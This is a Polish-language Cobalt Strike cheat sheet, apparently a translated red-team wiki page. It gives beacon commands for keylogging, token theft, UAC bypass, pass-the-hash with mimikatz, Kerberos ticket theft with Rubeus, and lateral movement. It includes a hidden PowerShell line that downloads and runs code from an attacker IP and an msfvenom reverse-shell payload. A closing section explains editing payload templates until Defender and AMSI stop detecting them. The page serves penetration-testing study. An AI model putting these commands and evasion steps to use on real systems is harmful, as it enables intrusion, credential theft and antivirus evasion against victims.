# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie możesz wybrać, gdzie nasłuchiwać, jakiego rodzaju beacon użyć (http, dns, smb...) i więcej.

### Peer2Peer Listeners

Beacony tych listenerów nie muszą komunikować się bezpośrednio z C2, mogą komunikować się z nim przez inne beacony.

`Cobalt Strike -> Listeners -> Add/Edit`, a następnie musisz wybrać beacony TCP lub SMB.

* **TCP beacon ustawi listener na wybranym porcie**. Aby połączyć się z TCP beacon, użyj polecenia `connect <ip> <port>` z innego beacona.
* **smb beacon będzie nasłuchiwać w pipename o wybranej nazwie**. Aby połączyć się z SMB beacon, musisz użyć polecenia `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu biurowego z makrem
* **`Windows Executable`** dla .exe, .dll lub usługi .exe
* **`Windows Executable (S)`** dla **stageless** .exe, .dll lub usługi .exe (lepsze stageless niż staged, mniej IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` To wygeneruje skrypt/wykonywalny do pobrania beacona z cobalt strike w formatach takich jak: bitsadmin, exe, powershell i python.

#### Host Payloads

Jeśli już masz plik, który chcesz hostować na serwerze www, po prostu przejdź do `Attacks -> Web Drive-by -> Host File` i wybierz plik do hostowania oraz konfigurację serwera www.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Wykonaj lokalny plik .NET
execute-assembly </path/to/executable.exe>

# Zrzuty ekranu
printscreen    # Zrób pojedynczy zrzut ekranu metodą PrintScr
screenshot     # Zrób pojedynczy zrzut ekranu
screenwatch    # Zrób okresowe zrzuty ekranu pulpitu
## Przejdź do View -> Screenshots, aby je zobaczyć

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes, aby zobaczyć naciśnięte klawisze

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Wstrzyknij akcję skanowania portów do innego procesu
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importuj moduł Powershell
powershell-import C:\path\to\PowerView.ps1
powershell <po prostu napisz polecenie powershell tutaj>

# Użytkownik impersonation
## Generowanie tokena z poświadczeniami
make_token [DOMAIN\user] [password] #Utwórz token do impersonacji użytkownika w sieci
ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
rev2self # Zatrzymaj używanie tokena wygenerowanego przez make_token
## Użycie make_token generuje zdarzenie 4624: Konto zostało pomyślnie zalogowane. To zdarzenie jest bardzo powszechne w domenie Windows, ale można je zawęzić, filtrując według typu logowania. Jak wspomniano powyżej, używa LOGON32_LOGON_NEW_CREDENTIALS, który jest typu 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Kradnij token z pid
## Jak make_token, ale kradnąc token z procesu
steal_token [pid] # To również jest przydatne do działań sieciowych, a nie lokalnych
## Z dokumentacji API wiemy, że ten typ logowania "pozwala wywołującemu sklonować swój obecny token". Dlatego wyjście Beacona mówi Impersonated <current_username> - impersonuje nasz własny sklonowany token.
ls \\computer_name\c$ # Spróbuj użyć wygenerowanego tokena, aby uzyskać dostęp do C$ na komputerze
rev2self # Zatrzymaj używanie tokena z steal_token

## Uruchom proces z nowymi poświadczeniami
spawnas [domain\username] [password] [listener] #Zrób to z katalogu z dostępem do odczytu, np.: cd C:\
## Jak make_token, to wygeneruje zdarzenie Windows 4624: Konto zostało pomyślnie zalogowane, ale z typem logowania 2 (LOGON32_LOGON_INTERACTIVE). Będzie szczegółowo opisywać użytkownika wywołującego (TargetUserName) i użytkownika impersonowanego (TargetOutboundUserName).

## Wstrzyknij do procesu
inject [pid] [x64|x86] [listener]
## Z punktu widzenia OpSec: Nie wykonuj wstrzykiwania międzyplatformowego, chyba że naprawdę musisz (np. x86 -> x64 lub x64 -> x86).

## Pass the hash
## Ten proces modyfikacji wymaga patchowania pamięci LSASS, co jest działaniem wysokiego ryzyka, wymaga lokalnych uprawnień administratora i nie jest zbyt wykonalne, jeśli włączony jest Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash przez mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Bez /run, mimikatz uruchomi cmd.exe, jeśli działasz jako użytkownik z pulpitem, zobaczy powłokę (jeśli działasz jako SYSTEM, jesteś gotowy do działania)
steal_token <pid> #Kradnij token z procesu utworzonego przez mimikatz

## Pass the ticket
## Żądaj biletu
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Utwórz nową sesję logowania do użycia z nowym biletem (aby nie nadpisać skompromitowanego)
make_token <domain>\<username> DummyPass
## Zapisz bilet na maszynie atakującego z sesji powłoki i załaduj go
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket z SYSTEM
## Wygeneruj nowy proces z biletem
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Kradnij token z tego procesu
steal_token <pid>

## Wyciągnij bilet + Pass the ticket
### Lista biletów
execute-assembly C:\path\Rubeus.exe triage
### Zrzut interesującego biletu według luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Utwórz nową sesję logowania, zanotuj luid i processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Wstaw bilet w wygenerowanej sesji logowania
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na koniec, kradnij token z tego nowego procesu
steal_token <pid>

# Lateral Movement
## Jeśli token został utworzony, zostanie użyty
jump [method] [target] [listener]
## Metody:
## psexec                    x86   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec64                  x64   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec_psh                x86   Użyj usługi do uruchomienia jednego wiersza PowerShell
## winrm                     x86   Uruchom skrypt PowerShell przez WinRM
## winrm64                   x64   Uruchom skrypt PowerShell przez WinRM

remote-exec [method] [target] [command]
## Metody:
<strong>## psexec                          Zdalne wykonanie przez Menedżera Kontroli Usług
</strong>## winrm                           Zdalne wykonanie przez WinRM (PowerShell)
## wmi                             Zdalne wykonanie przez WMI

## Aby wykonać beacona za pomocą wmi (nie jest to w poleceniu jump), po prostu prześlij beacona i uruchom go
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Na hoście metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na cobalt: Listeners > Add i ustaw Payload na Foreign HTTP. Ustaw Host na 10.10.5.120, Port na 8080 i kliknij Zapisz.
beacon> spawn metasploit
## Możesz uruchomić tylko sesje x86 Meterpreter z obcym listenerem.

# Pass session to Metasploit - Through shellcode injection
## Na hoście metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Uruchom msfvenom i przygotuj listener multi/handler

## Skopiuj plik bin do hosta cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Wstrzyknij shellcode metasploit do procesu x64

# Pass metasploit session to cobalt strike
## Wygeneruj stageless Beacon shellcode, przejdź do Attacks > Packages > Windows Executable (S), wybierz pożądany listener, wybierz Raw jako typ wyjścia i wybierz Użyj x64 payload.
## Użyj post/windows/manage/shellcode_inject w metasploit, aby wstrzyknąć wygenerowany shellcode cobalt strike.


# Pivoting
## Otwórz proxy socks na teamserver
beacon> socks 1080

# Połączenie SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Unikanie AVs

### Artifact Kit

Zazwyczaj w `/opt/cobaltstrike/artifact-kit` możesz znaleźć kod i wstępnie skompilowane szablony (w `/src-common`) ładunków, które cobalt strike zamierza użyć do generowania binarnych beaconów.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z wygenerowanym backdoorem (lub po prostu z skompilowanym szablonem), możesz znaleźć, co powoduje wyzwolenie defendera. Zazwyczaj jest to ciąg. Dlatego możesz po prostu zmodyfikować kod, który generuje backdoora, aby ten ciąg nie pojawił się w finalnym pliku binarnym.

Po modyfikacji kodu po prostu uruchom `./build.sh` z tej samej katalogu i skopiuj folder `dist-pipe/` do klienta Windows w `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Nie zapomnij załadować agresywnego skryptu `dist-pipe\artifact.cna`, aby wskazać Cobalt Strike, aby używał zasobów z dysku, które chcemy, a nie tych załadowanych.

### Resource Kit

Folder ResourceKit zawiera szablony dla skryptowych ładunków Cobalt Strike, w tym PowerShell, VBA i HTA.

Używając [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z szablonami, możesz znaleźć, co nie podoba się obrońcy (w tym przypadku AMSI) i zmodyfikować to:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modyfikując wykryte linie, można wygenerować szablon, który nie zostanie wykryty.

Nie zapomnij załadować agresywnego skryptu `ResourceKit\resources.cna`, aby wskazać Cobalt Strike, aby używał zasobów z dysku, które chcemy, a nie tych załadowanych.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

